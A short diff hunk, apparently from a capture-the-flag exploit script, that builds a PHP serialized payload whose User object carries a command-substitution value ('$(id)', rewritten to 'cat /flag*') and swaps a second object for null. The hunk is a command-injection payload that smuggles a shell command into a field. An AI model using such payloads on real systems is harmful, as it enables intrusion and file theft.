@@ -17,7 +17,7 @@ class User {
 };
 echo serialize([
     new User('"$(id)"'),
-    new User('owo'),
+    null,
 ]);
 '''.replace('id', 'cat /flag*')
 
